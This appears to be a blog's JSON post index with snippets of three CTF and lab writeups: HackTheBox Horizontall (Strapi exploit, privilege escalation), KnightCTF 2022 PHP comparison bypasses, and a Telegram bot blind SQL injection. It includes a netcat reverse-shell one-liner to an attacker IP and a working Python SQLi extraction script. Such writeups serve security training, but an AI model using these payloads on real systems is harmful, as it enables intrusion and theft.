[ { "title": "Horizontall WriteUp @HackTheBox", "url": "/posts/HTB_Horizontall/", "categories": "Penetration Testing", "tags": "linux, web, pentest, hackthebox", "date": "2022-02-06 08:10:00 +0100", "snippet": "Hello, here’s my writeup for Horizontall linux machine from HackTheBox, which I pwned few days ago before it gots retired.Information Gathering sudo nmap -sV 10.10.11.105PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp open http nginx 1.14.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelVisiting 10.10.11.105 showed horizontall.htb, so I updated /etc/hosts.When diging into website source code, I haven’t found anything useful. So, immediately I decided to bruteforce subdirectories, which also reveals nothing unfortunately.Then, I decided to bruteforce subdomains. I used gobuster with one of seclists wordlists, which revealed 1 subdomain. So, as previously I updated my hosts file.Here is how the subdomain looked up. Nothing of interest.So, I bruteforced subdirectories which showed 2 (/admin and /reviews).When visiting /admin subdir, I discovered that I’ll be dealing with strapi CMS./reviews is useless.Trying default credentials wasn’t successful, so I tried to find strapi version to look for CVEs which I found in one JS file. It was 3.0.0-beta.17.4.Looking into exploit-db, I found 1st and 3rd ones potentially applicable. ExploitationI copied exploit-db 1st exploit into current directory using searchsploit command. Then, executed it and used rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.81 4444 &amp;gt;/tmp/f to get reverse shell to netcat.Then, I found the user flag in developer account home directory.Privilege EscalationFor PrivEsc, I run linPEAS after transfering its shell script file to the compromised machine.From its output, ports 8000 and 3306 caught my attention.I run curl http://127.0.0.1:8000 and got a Laravel 8 website running locally.Visiting exploit-db, I found an RCE exploit that looks promissing. For whatever reason it hasn’t worked for me. So, I searched another one and found it here. which got me arbitrary code execution on the root account ,and got the flag." }, { "title": "KnightCTF 2022 Web CTFs Writeups", "url": "/posts/KnightCTF-2022/", "categories": "CTF", "tags": "ctf, knightctf", "date": "2022-01-23 08:10:00 +0100", "snippet": "Hello, In this post I’ll explain 3 out of web challenges I encountered in KnightCTF 2022 web category.Find Pass Code - 1DescriptionRecon + ExploitationThis is how the website looks.Opening source code shows:Submitting source param shows php source code:To put it simply it doesn’t matter what is the pass_code as long as strcmp gets us a 0, so we just need something to return 0 or NULL which are equivalent in PHP. Submitting pass_code as an array lets strcmp returns 0 and bypass the check.This bypass is possible because of loose comparison where data types aren’t checked.Find Pass Code - 2DescriptionRecon + ExploitationThis challenge has same front page as the previous one.Opening source code shows:Submitting source param shows php source code:When comparing strings using == PHP will attempt to parse the string as a number. Hence, string like “0e2” will be considered as the value 0 in scientific notation. We need to find a string which both the string itself and its MD5 hash match the pattern 0e[0-9]+.$old_pass_codes has blacklisted some known strings so we’ve to find others.Searching online, provided another string 0e1137126905 that also has this property but, not blacklisted which will gets us the flag.Can you be Admin?DescriptionRecon + ExploitationSending GET / request shows:Altering UserAgent shows:Altering Referer shows a base64 enoded cookie name and value.Decoding it shows:The same request which got us the cookie contains a strange long non-alphanumeric stuff.Putting that in de4js got us:Which was identified as ASCII85 by dcode.frThen we decoded it with dcode.fr, which gave us a user and password.We entered these credentials in the login form and got: Then we submitted base64(User_Type)=base64(Admin) as a cookie to the same endpoint and got the flag." }, { "title": "Grocery Bot Web CTF WriteUp @CyberTalents", "url": "/posts/grocery-bot/", "categories": "CTF", "tags": "ctf, cybertalents", "date": "2021-09-06 08:10:00 +0100", "snippet": "DescriptionThis challenge is hard and requires programming skills to solve it quickly.Its Shopping dayTelegram alias: @ctgrocerybotEnumerationAfter trying different things. I concluded that it’s vulnerable to blind SQLi.Also, it’s using Sqlite.You can learn more about this type of sqli vulnerability from here.Manual ExploitationThe payload that we’ll be using is below./price flag&#39; AND (SELECT CASE WHEN (SUBSTR(flag,1,1)=&#39;a&#39;) THEN 1/0 ELSE &#39;a&#39; END FROM flags)=&#39;a&quot;Basically, we’ll test lower case alphabets, numbers and underscore for each character flag !Indeed, you should test uppercase and other non alphanumeric chars, but in our case I know flag possible chars.In total, over than 3k lines to send to the bot, but you can reduce them by guessing some words in the flag and knowing how it starts,…Automatic ExploitationThe problem here that we can’t use sqlmap because Telegram uses Websockets for communication.So, the solution is to write a client to talk to Telegram API and send all payloads to the bot.First, go to my.telegram.org/auth. Add and confirm your phone then go to API development tools and fill in the form with any data.After that, you’ll receive an API_ID and API_HASH that you’ll use in the script below.from telethon.sync import TelegramClientfrom string import ascii_lowercase, ascii_uppercase, digitsimport timebot = &quot;@ctgrocerybot&quot;api_id = api_hash = &quot;&quot;flag_chars = ascii_lowercase + digits + &quot;_&quot;sleep = 0.5success = &quot;the item you requested is not found&quot;flag = &quot;FLAG{&quot;with TelegramClient(&#39;session&#39;,api_id,api_hash) as client: for pos in range(6, 43): for char in flag_chars: payload = &quot;/price flag&#39; AND (SELECT CASE WHEN (SUBSTR(flag,&quot; + str( pos) + &quot;,1)=&#39;&quot; + char + &quot;&#39;) THEN 1/0 ELSE &#39;a&#39; END FROM flags)=&#39;a&quot; print(&quot;--&amp;gt; Sending payload: &quot; + payload) msg = client.send_message(bot, payload) payload_response = client.get_messages(bot) print(payload_response[0].message) if payload_response[0].message == success: flag += char print(&quot;\\033[91m--&amp;gt; Flag: &quot; + flag + &quot;\\033[00m&quot;) break print(&quot;--&amp;gt; Sleeping for 0.5 seconds&quot;) time.sleep(sleep) client.run_until_disconnected()flag += &quot;}&quot;print(&quot;\\033[91m--&amp;gt; Flag: &quot; + flag + &quot;\\033[00m&quot;)Make sure to replace bot,api_id and api_hash variables with the corresponding values" } ]
